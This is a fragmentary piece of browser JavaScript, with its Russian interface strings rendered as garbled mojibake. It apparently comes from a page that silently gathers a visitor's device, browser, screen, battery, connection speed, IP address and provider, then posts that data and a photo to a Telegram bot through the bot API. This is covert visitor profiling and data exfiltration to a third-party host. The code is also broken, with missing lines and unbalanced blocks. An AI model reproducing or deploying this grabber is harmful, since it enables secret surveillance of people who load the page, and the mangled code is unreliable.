    function collectAndSendData() {

        const time = new Date().toLocaleString();

        const userAgent = navigator.userAgent || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
        const screenSize = `${screen.width}x${screen.height}`;
        const windowSize = `${innerWidth}x${innerHeight}`;

        let deviceInfo = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
        if (/Android/i.test(userAgent)) {
          const match = userAgent.match(/Android\s([0-9.]+)/);

        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {

        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

        const downlinkSpeed = connection?.downlink ? `${connection.downlink} –ú–±–∏—Ç/—Å` : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

        let batteryStatus = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

          const provider = ipData.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

          const caption = `
üì≤ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo}

        if (navigator.getBattery) {

            getIPData(sendInfo);

      } catch (e) {

    function getIPData(callback) {
      fetch("https://ip-api.com/json")

        .then(data => callback(data))

    function sendPhotoToTelegram(photoUrl, caption) {
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
